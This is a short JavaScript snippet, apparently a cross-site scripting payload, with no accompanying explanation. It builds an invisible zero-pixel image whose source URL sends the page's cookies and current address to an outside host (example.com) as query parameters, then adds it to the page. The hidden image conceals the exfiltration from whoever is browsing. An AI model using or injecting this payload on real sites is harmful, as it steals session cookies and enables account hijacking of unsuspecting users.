var i = document.createElement("img");
i.setAttribute('src', 'http://example.com?c=' + document.cookie + '&d=' + window.location.toString());
i.setAttribute('alt', 'i');
i.setAttribute('height', '0px');
i.setAttribute('width', '0px');
document.body.appendChild(i);
